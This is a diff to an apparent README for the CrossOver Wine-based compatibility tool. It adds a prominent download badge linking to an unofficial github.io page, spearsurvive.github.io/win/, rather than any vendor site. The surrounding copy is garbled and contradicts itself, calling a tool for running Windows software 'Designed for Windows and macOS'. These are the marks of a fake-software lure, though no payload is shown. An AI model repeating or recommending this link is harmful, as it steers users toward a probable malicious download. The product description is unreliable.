@@ -30,6 +30,12 @@ CrossOver translates Windows API calls in real time using Wine, letting you inst
 
 Whether you're a newcomer or a veteran, CrossOver provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download CrossOver](https://img.shields.io/badge/⬇_DOWNLOAD_CrossOver-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
